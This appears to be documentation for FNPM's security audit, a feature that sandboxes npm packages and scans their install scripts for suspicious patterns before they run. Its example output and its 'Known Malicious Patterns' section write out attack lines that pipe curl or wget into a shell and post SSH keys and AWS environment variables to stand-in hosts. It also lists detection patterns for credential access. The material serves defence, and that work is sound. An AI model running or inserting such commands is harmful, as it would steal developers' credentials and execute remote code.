# 🛡️ FNPM Security Audit

## Overview

FNPM includes a built-in security auditing system that protects you from malicious packages by analyzing their install scripts **before** they execute on your system.

This feature was implemented in response to supply chain attacks like **sha1-hulud** and other malicious packages that execute harmful code during installation.

## How It Works

When you run `fnpm add <package>`, FNPM:

1. **🔒 Installs in sandbox** - Temporarily installs the package in `/tmp` with `--ignore-scripts`
2. **🔍 Analyzes package.json** - Extracts and examines all lifecycle scripts
3. **⚠️ Detects suspicious patterns** - Scans for dangerous commands and behaviors
4. **📊 Calculates risk level** - Assigns a risk score (Safe → Critical)
5. **✋ Asks confirmation** - Prompts you before proceeding with risky packages
6. **✅ Proceeds safely** - Only installs if you approve

## Risk Levels

- **✓ SAFE** - No install scripts found
- **⚠ LOW** - Has install scripts but no suspicious patterns
- **⚠ MEDIUM** - Contains 1-2 suspicious patterns
- **⚠ HIGH** - Contains 3-4 suspicious patterns
- **☠ CRITICAL** - Contains 5+ suspicious patterns

## Suspicious Patterns Detected

The scanner looks for:

- **Network activity**: `curl`, `wget`, `fetch()`, `http` requests
- **Code execution**: `eval`, `exec`, `spawn`, `child_process`
- **File operations**: `rm -rf`, `fs.writeFile`, `chmod +x`
- **Credential access**: `~/.ssh`, `~/.aws`, `process.env`
- **Obfuscation**: `base64`, unusual encoding
- **System access**: `/etc/passwd`, `/tmp` writes
- **External code**: `git clone`, downloads from internet

## Example Output

```bash
$ fnpm add suspicious-package

🔐 Security check for: suspicious-package

   Installing suspicious-package in sandbox...

═══════════════════════════════════════════
📦 Package: suspicious-package
🛡️  Risk Level: ⚠ HIGH
═══════════════════════════════════════════

📜 Install Scripts:
  postinstall: curl http://evil.com/steal.sh | bash

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet
  • eval: Executes arbitrary code
  • env: Accesses environment variables

═══════════════════════════════════════════

? This package has HIGH RISK patterns. Really continue? (y/N)
```

## Usage

### Default Behavior (Audit Enabled)

```bash
# Security audit runs automatically
fnpm add express
```

### Disable Audit for a Single Install

```bash
# Skip audit (not recommended!)
fnpm add trusted-package --no-audit
```

### Disable Audit Globally

Edit `.fnpm/config.json`:

```json
{
  "package_manager": "npm",
  "security_audit": false
}
```

### Audit Global Packages

Security audits are **automatically skipped** for global installations:

```bash
# No audit (globals are assumed safe)
fnpm add -g typescript
```

## Configuration

In your project's `.fnpm/config.json`:

```json
{
  "package_manager": "npm",
  "global_cache_path": "~/.local/share/.fnpm/cache",
  "security_audit": true  // ← Enable/disable auditing
}
```

## False Positives

Some legitimate packages may trigger warnings. For example:

- **Build tools** (webpack, rollup) - May use `child_process` for compilation
- **CLI tools** (create-react-app) - May download templates
- **Native modules** (node-gyp) - May use compilation scripts

Always review the actual script content before deciding!

## Best Practices

1. **✅ Always review** the script content shown in the report
2. **✅ Check npm page** - Visit npmjs.com to verify package legitimacy
3. **✅ Check GitHub** - Look at the source repository
4. **✅ Check downloads** - Popular packages are usually safer
5. **❌ Don't blindly approve** high-risk packages
6. **❌ Don't disable audit** unless absolutely necessary

## Known Malicious Patterns

These are **immediate red flags**:

```bash
# Downloading and executing remote code
curl http://example.com/script.sh | bash
wget -qO- http://example.com/payload | sh

# Accessing credentials
cat ~/.ssh/id_rsa | curl -X POST http://evil.com
env | grep AWS | curl -X POST http://attacker.com

# Obfuscated payloads
eval $(echo "base64_encoded_malicious_code" | base64 -d)
```

## Comparison with npm audit

| Feature | npm audit | fnpm security |
|---------|-----------|---------------|
| Checks CVE database | ✅ | ❌ |
| Scans install scripts | ❌ | ✅ |
| Prevents execution | ❌ | ✅ |
| Pre-install check | ❌ | ✅ |
| Pattern detection | ❌ | ✅ |

**Use both!** FNPM security complements `npm audit`:
- npm audit → Finds known vulnerabilities
- fnpm security → Prevents zero-day supply chain attacks

## Technical Details

### Sandbox Implementation

```rust
// Installs with --ignore-scripts in temp directory
npm install package --ignore-scripts --prefix /tmp/fnpm-audit-xxx
```

### Temporary Directory Cleanup

The sandbox is automatically cleaned up after analysis:

```rust
impl Drop for SecurityScanner {
    fn drop(&mut self) {
        // Auto-cleanup on exit
        fs::remove_dir_all(&self.temp_dir);
    }
}
```

### Supported Package Managers

- ✅ **npm** - Full support
- ✅ **pnpm** - Full support
- ✅ **yarn** - Full support
- ✅ **bun** - Full support
- ❌ **deno** - Not applicable (uses URLs)

## Contributing

To add new suspicious patterns, edit `src/security.rs`:

```rust
let suspicious = vec![
    ("your_pattern", "Reason why it's suspicious"),
    // ...
];
```

## Related

- [npm security best practices](https://docs.npmjs.com/security-best-practices)
- [Socket.dev](https://socket.dev) - Alternative security scanner
- [Snyk](https://snyk.io) - Vulnerability scanning
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

## License

Same as FNPM - see [LICENSE](../LICENSE)
